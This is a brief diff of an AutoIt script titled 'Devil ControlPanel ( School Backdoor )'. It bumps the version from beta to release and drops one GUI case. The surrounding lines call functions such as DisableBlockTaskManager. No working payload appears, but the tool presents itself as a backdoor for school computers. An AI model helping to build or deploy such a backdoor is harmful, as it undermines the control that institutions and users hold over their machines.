@@ -2,7 +2,7 @@
 
  Devil ControlPanel ( School Backdoor )
  AutoIt Version: 3.3.14.2
- Version: Beta 3 ( 20:55 11.09.2017)
+ Version: Release ( 19:45 12.09.2017)
 
 #ce ----------------------------------------------------------------------------
 
@@ -106,8 +106,6 @@ While True
             LockGUI()
             DisableBlockTaskManager()
             UnLockGUI()
-        Case $Text
-            GUICtrlSetData($InputBox, "PublicData")
 	EndSwitch
 WEnd
 
